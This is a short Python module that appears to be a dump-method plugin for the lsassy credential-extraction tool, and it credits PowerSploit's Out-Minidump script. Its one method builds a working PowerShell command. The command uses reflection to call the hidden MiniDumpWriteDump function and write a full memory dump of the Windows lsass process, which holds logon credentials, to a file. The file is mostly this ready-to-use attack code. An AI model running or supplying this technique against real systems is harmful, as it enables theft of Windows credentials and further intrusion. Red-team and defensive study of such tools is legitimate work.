"""
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
From https://twitter.com/JohnLaTwC/status/1411345380407578624
"""

from lsassy.dumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):
    def get_commands(self):
        pwsh_command = """$PL = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $PL.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MDWD = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = '{}{}';$FS = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MDWD.Invoke($null, @($p.Handle,$p.Id,$FS.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FS.Close()""".format(
            self.dump_path, self.dump_name
        )
        return {"cmd": None, "pwsh": pwsh_command}


